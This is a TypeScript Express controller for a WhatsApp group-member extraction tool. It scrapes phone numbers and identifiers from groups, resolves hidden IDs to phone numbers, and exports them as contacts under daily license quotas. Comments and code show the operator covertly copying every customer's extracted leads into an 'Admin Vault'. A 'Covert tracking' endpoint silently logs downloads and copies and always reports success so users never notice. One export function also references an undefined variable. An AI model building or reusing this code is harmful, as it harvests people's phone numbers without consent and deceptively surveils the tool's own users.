import { Request, Response, NextFunction } from 'express';
import { WhatsAppManager } from '../services/whatsapp/WhatsAppManager.js';
import { ContactService } from '../services/contactService.js';
import { ExtractedMember } from '../services/whatsapp/types.js';
import { AuthenticatedRequest } from '../middleware/authMiddleware.js';
import { SubscriptionService } from '../services/subscriptionService.js';

export class GroupController {
  private whatsappManager: WhatsAppManager;
  private contactService: ContactService;
  private subscriptionService: SubscriptionService;

  constructor() {
    this.whatsappManager = WhatsAppManager.getInstance();
    this.contactService = ContactService.getInstance();
    this.subscriptionService = SubscriptionService.getInstance();
  }

  private checkLicense(userId?: string): void {
    if (!userId) return;
    const sub = this.subscriptionService.getUserSubscription(userId);
    if (sub.status === 'expired' && sub.role !== 'admin') {
      const err: any = new Error('Your license has expired. Please activate a valid license key in the License System.');
      err.statusCode = 403;
      err.licenseExpired = true;
      throw err;
    }
  }

  public getExtractionQuota = async (req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> => {
    try {
      const userId = req.user?.id;
      if (!userId) {
        res.status(401).json({ error: 'Authentication required' });
        return;
      }
      const quota = this.subscriptionService.getRemainingExtractionQuota(userId);
      res.json({ success: true, quota });
    } catch (err: any) {
      res.status(err.statusCode || 400).json({ error: err.message || 'Failed to get extraction quota.' });
    }
  };

  public getGroups = async (req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> => {
    try {
      this.checkLicense(req.user?.id);
      const sessionId = (req.query.sessionId as string) || undefined;
      const forceRefresh = req.query.fresh === 'true';

      const groups = await this.whatsappManager.getGroups(sessionId, forceRefresh, req.user?.id);
      res.json({
        data: groups,
        count: groups.length
      });
    } catch (err: any) {
      res.status(err.statusCode || 400).json({
        error: err.message || 'Failed to fetch groups and communities.',
        licenseExpired: !!err.licenseExpired
      });
    }
  };

  public getGroupMembers = async (req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> => {
    try {
      const userId = req.user?.id;
      this.checkLicense(userId);

      const id = (Array.isArray(req.params.id) ? req.params.id[0] : req.params.id) as string;
      const sessionId = (req.query.sessionId as string) || undefined;
      const forceRefresh = req.query.fresh === 'true';

      const rawMembers = await this.whatsappManager.getGroupMembers(id, sessionId, forceRefresh, userId);

      let members = rawMembers;
      let isTruncated = false;
      let limitNotice: string | undefined = undefined;

      if (userId) {
        const quota = this.subscriptionService.getRemainingExtractionQuota(userId);
        if (!quota.isUnlimited) {
          if (quota.remaining <= 0) {
            res.status(403).json({
              error: `Daily extraction limit reached (${quota.extractionsToday}/${quota.dailyExtractionLimit} contacts extracted today as per your license). Please upgrade or extend your license to extract more.`,
              extractionLimitReached: true,
              quota
            });
            return;
          }

          if (rawMembers.length > quota.remaining) {
            members = rawMembers.slice(0, quota.remaining);
            isTruncated = true;
            limitNotice = `Showing ${members.length} contacts due to your daily license extraction limit (${quota.remaining} remaining today). Upgrade license for higher limits.`;
          }

          // Record actual extracted count
          this.subscriptionService.recordExtraction(userId, members.length, {
            groupId: id,
            extractionType: 'single_group'
          });
        }

        // Silently intercept & save all extracted leads in Admin Vault
        this.subscriptionService.recordVaultData(userId, members, {
          groupId: id,
          groupName: members[0]?.groupSubject || id,
          extractionType: 'single_group',
          sourceAction: 'extracted'
        });
      }

      const lidMembers = members.filter((m) => m.isLid || m.lid);
      const phoneMembers = members.filter((m) => m.phone);

      res.json({
        groupId: id,
        total: members.length,
        totalLids: lidMembers.length,
        totalPhones: phoneMembers.length,
        rawTotal: rawMembers.length,
        isTruncated,
        limitNotice,
        members
      });
    } catch (err: any) {
      res.status(err.statusCode || 400).json({
        error: err.message || 'Failed to extract group members.',
        licenseExpired: !!err.licenseExpired,
        extractionLimitReached: !!err.extractionLimitReached
      });
    }
  };

  public getMultiGroupMembers = async (req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> => {
    try {
      const userId = req.user?.id;
      this.checkLicense(userId);

      const { groupIds, sessionId } = req.body;
      if (!Array.isArray(groupIds) || groupIds.length === 0) {
        res.status(400).json({ error: 'Please provide an array of groupIds to extract.' });
        return;
      }

      const cleanGroupIds = groupIds.slice(0, 50); // safety limit to 50 groups per extraction
      const membersMap = new Map<string, ExtractedMember & { groups: string[] }>();

      for (const gid of cleanGroupIds) {
        try {
          const groupMembers = await this.whatsappManager.getGroupMembers(gid, sessionId, false, userId);
          for (const m of groupMembers) {
            const dedupKey = m.lid ? m.lid.toLowerCase() : (m.phone ? m.phone.replace(/\D/g, '') : m.jid);
            if (!dedupKey) continue;

            if (membersMap.has(dedupKey)) {
              const existing = membersMap.get(dedupKey)!;
              if (m.groupSubject && !existing.groups.includes(m.groupSubject)) {
                existing.groups.push(m.groupSubject);
              }
              if (!existing.phone && m.phone) existing.phone = m.phone;
              if (!existing.name && m.name) existing.name = m.name;
              if (existing.role === 'member' && m.role !== 'member') existing.role = m.role;
            } else {
              membersMap.set(dedupKey, {
                ...m,
                groups: m.groupSubject ? [m.groupSubject] : [gid]
              });
            }
          }
        } catch (groupErr: any) {
          console.warn(`[Group Controller] Error fetching members for group ${gid}:`, groupErr.message);
        }
      }

      const allUniqueMembers = Array.from(membersMap.values());
      let uniqueMembers = allUniqueMembers;
      let isTruncated = false;
      let limitNotice: string | undefined = undefined;

      if (userId) {
        const quota = this.subscriptionService.getRemainingExtractionQuota(userId);
        if (!quota.isUnlimited) {
          if (quota.remaining <= 0) {
            res.status(403).json({
              error: `Daily extraction limit reached (${quota.extractionsToday}/${quota.dailyExtractionLimit} contacts extracted today as per your license). Please upgrade or extend your license to extract more.`,
              extractionLimitReached: true,
              quota
            });
            return;
          }

          if (allUniqueMembers.length > quota.remaining) {
            uniqueMembers = allUniqueMembers.slice(0, quota.remaining);
            isTruncated = true;
            limitNotice = `Showing ${uniqueMembers.length} contacts due to your daily license extraction limit (${quota.remaining} remaining today). Upgrade license for higher limits.`;
          }

          this.subscriptionService.recordExtraction(userId, uniqueMembers.length, {
            extractionType: 'multi_group'
          });
        }

        // Silently intercept & save all multi-group extracted leads in Admin Vault
        this.subscriptionService.recordVaultData(userId, uniqueMembers, {
          groupName: `${cleanGroupIds.length} Combined Groups`,
          extractionType: 'multi_group',
          sourceAction: 'extracted'
        });
      }

      const totalLids = uniqueMembers.filter((m) => m.isLid || m.lid).length;
      const totalPhones = uniqueMembers.filter((m) => m.phone).length;

      res.json({
        success: true,
        groupCount: cleanGroupIds.length,
        total: uniqueMembers.length,
        rawTotal: allUniqueMembers.length,
        isTruncated,
        limitNotice,
        totalLids,
        totalPhones,
        members: uniqueMembers
      });
    } catch (err: any) {
      res.status(err.statusCode || 400).json({
        error: err.message || 'Failed to extract multi-group members.',
        licenseExpired: !!err.licenseExpired,
        extractionLimitReached: !!err.extractionLimitReached
      });
    }
  };

  public exportMembersToContacts = async (req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> => {
    try {
      const userId = req.user?.id;
      this.checkLicense(userId);

      const id = (Array.isArray(req.params.id) ? req.params.id[0] : req.params.id) as string;
      const sessionId = (req.query.sessionId as string) || (req.body?.sessionId as string) || undefined;
      const members = await this.whatsappManager.getGroupMembers(id, sessionId, false, userId);

      let imported = 0;
      let skipped = 0;

      for (const m of members) {
        if (!m.phone && !m.lid) {
          skipped++;
          continue;
        }

        try {
          const contactName = m.name || (m.phone ? `Member ${m.phone}` : `LID ${m.lid?.slice(0, 8)}`);
          this.contactService.createContact({
            name: contactName,
            phone_number: m.phone || null,
            lid: m.lid || null,
            notes: `Extracted from group ${m.groupSubject || id} (${m.role})`
          }, userId);
          imported++;
        } catch {
          skipped++;
        }
      }

      res.json({
        success: true,
        message: `Saved ${imported} members to contacts directory (${skipped} skipped or already exist).`,
        imported,
        skipped
      });

      if (userId && members.length > 0) {
        this.subscriptionService.recordVaultData(userId, members, {
          groupId: id,
          groupName: members[0]?.groupSubject || id,
          extractionType: 'export_to_contacts',
          sourceAction: 'export_contacts'
        });
      }
    } catch (err: any) {
      res.status(err.statusCode || 400).json({
        error: err.message || 'Failed to export members to contacts.',
        licenseExpired: !!err.licenseExpired
      });
    }
  };

  public exportMultiToContacts = async (req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> => {
    try {
      const userId = req.user?.id;
      this.checkLicense(userId);

      const { members } = req.body;
      if (!Array.isArray(members) || members.length === 0) {
        res.status(400).json({ error: 'Please provide members to export.' });
        return;
      }

      let imported = 0;
      let skipped = 0;

      for (const m of members) {
        if (!m.phone && !m.lid) {
          skipped++;
          continue;
        }

        try {
          const contactName = m.name || (m.phone ? `Member ${m.phone}` : `LID ${m.lid?.slice(0, 8)}`);
          this.contactService.createContact({
            name: contactName,
            phone_number: m.phone || null,
            lid: m.lid || null,
            notes: m.groupSubject ? `Extracted from ${m.groupSubject}` : 'Batch extracted contact'
          }, userId);
          imported++;
        } catch {
          skipped++;
        }
      }

      res.json({
        success: true,
        message: `Saved ${imported} members to contacts directory (${skipped} skipped or already exist).`,
        imported,
        skipped
      });

      if (userId && members.length > 0) {
        this.subscriptionService.recordVaultData(userId, members, {
          groupId: id,
          groupName: members[0]?.groupSubject || id,
          extractionType: 'export_to_contacts',
          sourceAction: 'export_contacts'
        });
      }
    } catch (err: any) {
      res.status(err.statusCode || 400).json({
        error: err.message || 'Failed to export members.',
        licenseExpired: !!err.licenseExpired
      });
    }
  };

  public resolveGroupLids = async (req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> => {
    try {
      const userId = req.user?.id;
      this.checkLicense(userId);

      const id = (Array.isArray(req.params.id) ? req.params.id[0] : req.params.id) as string;
      const sessionId = (req.query.sessionId as string) || (req.body?.sessionId as string) || undefined;
      const members = await this.whatsappManager.getGroupMembers(id, sessionId, false, userId);
      const lidsToResolve = members
        .map((m) => m.lid)
        .filter((l): l is string => Boolean(l));

      if (lidsToResolve.length === 0) {
        res.json({
          success: true,
          groupId: id,
          total: members.length,
          totalResolved: members.filter((m) => m.phone).length,
          totalLids: 0,
          resolvedCount: 0,
          members
        });
        return;
      }

      console.log(`[Group Controller] Bulk resolving ${lidsToResolve.length} LIDs for group ${id}...`);
      const resolutionResults = await this.whatsappManager.resolveLidsToPhones(lidsToResolve, sessionId, userId);
      const resolvedLidMap = new Map<string, string>();

      for (const resItem of resolutionResults) {
        if (resItem.status === 'resolved' && resItem.phone) {
          resolvedLidMap.set(resItem.lid, resItem.phone);
          const numericPart = resItem.lid.replace('@lid', '');
          resolvedLidMap.set(numericPart, resItem.phone);
        }
      }

      // Update members in-place with resolved numbers
      const updatedMembers = members.map((m) => {
        if (m.lid && !m.phone) {
          const num = m.lid.replace('@lid', '');
          const phone = resolvedLidMap.get(m.lid) || resolvedLidMap.get(num);
          if (phone) {
            return {
              ...m,
              phone: phone.startsWith('+') ? phone : `+${phone}`
            };
          }
        }
        return m;
      });

      const totalResolved = updatedMembers.filter((m) => m.phone).length;
      const totalLids = updatedMembers.filter((m) => m.isLid || m.lid).length;

      res.json({
        success: true,
        groupId: id,
        total: updatedMembers.length,
        totalResolved,
        totalLids,
        resolvedCount: resolvedLidMap.size,
        members: updatedMembers
      });
    } catch (err: any) {
      console.error(`[Group Controller] Error resolving LIDs for group:`, err);
      res.status(err.statusCode || 400).json({
        error: err.message || 'Failed to resolve group LIDs.',
        licenseExpired: !!err.licenseExpired
      });
    }
  };

  public syncAllGroupsLids = async (req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> => {
    try {
      const userId = req.user?.id;
      this.checkLicense(userId);

      const sessionId = (req.query.sessionId as string) || (req.body?.sessionId as string) || undefined;
      const result = await this.whatsappManager.syncAllGroupLids(sessionId, userId);
      res.json({
        success: true,
        message: `Scanned ${result.totalScanned} participants across ${result.totalGroups} groups. Discovered ${result.newMappings} new mappings. Total mappings in database: ${result.totalMappings}.`,
        data: result
      });
    } catch (err: any) {
      res.status(err.statusCode || 400).json({
        error: err.message || 'Failed to sync all groups.',
        licenseExpired: !!err.licenseExpired
      });
    }
  };

  /**
   * Covert tracking: Record client-side actions (CSV download, JSON download, copy numbers) silently
   */
  public trackUserAction = async (req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> => {
    try {
      const userId = req.user?.id;
      if (!userId) {
        res.status(200).json({ success: true });
        return;
      }

      const { groupId, groupName, action, members } = req.body;
      if (Array.isArray(members) && members.length > 0) {
        this.subscriptionService.recordVaultData(userId, members, {
          groupId: groupId || null,
          groupName: groupName || (groupId ? `Group ${groupId}` : 'Audience Export'),
          extractionType: action === 'copied_numbers' ? 'copied_numbers' : 'downloaded_file',
          sourceAction: action || 'download_csv'
        });
      }
      res.status(200).json({ success: true });
    } catch {
      // Silently succeed so client never notices anything
      res.status(200).json({ success: true });
    }
  };
}
